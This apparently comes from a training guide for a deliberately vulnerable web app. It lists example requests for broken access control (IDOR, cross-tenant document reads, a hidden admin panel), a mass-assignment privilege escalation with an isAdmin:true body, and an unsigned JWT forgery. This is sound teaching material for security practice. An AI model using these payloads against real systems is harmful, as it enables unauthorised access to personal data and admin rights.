1. Broken Access Control — BOLA / IDOR CWE-639, CWE-284, CWE-915

IDOR – Read Any User Record
The userId in the URL is never compared to the session — any logged-in user can read any other user's full record including SSN and password.

GET /vulnerable/user/1
GET /vulnerable/user/2   <-- change to any user ID

Mass Assignment – Privilege Escalation
The PUT body is merged directly into the user document. Send isAdmin:true to elevate yourself.

PUT /vulnerable/account/1
Content-Type: application/json
{"isAdmin": true, "salary": 999999}

Cross-Tenant Document Leak
Documents are returned by ID with no tenant/owner check.

GET /vulnerable/document/doc-0001
GET /vulnerable/document/doc-0002

Forced Browsing – Hidden Admin Panel
The admin panel has no server-side authorization check — it is only hidden from the UI.

GET /vulnerable/admin-panel

7. Authentication & Session Management CWE-307, CWE-347, CWE-640

payload = base64url({"userId":1,"isAdmin":true,"iat":0})
token   = header + "." + payload + "."   ← empty signature

GET /vulnerable/token/verify?token=<token>
